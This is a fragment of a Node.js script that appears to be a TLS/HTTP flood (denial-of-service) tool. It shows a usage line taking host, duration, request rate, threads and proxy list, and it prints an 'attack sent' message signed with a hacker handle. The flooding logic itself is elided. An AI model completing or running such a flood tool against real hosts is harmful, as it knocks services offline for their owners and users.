const net = require("net");
 ...
 if (process.argv.length < 7){console.log(gradient.vice(`[!] node TLS.js <HOST> <TIME> <RPS> <THREADS> <PROXY>.`));; process.exit();}
 const headers = {};
 ...
 console.log(gradient.vice(`[!] SUCCESSFULLY SENT ATTACK(@t_gray_hacker).`));
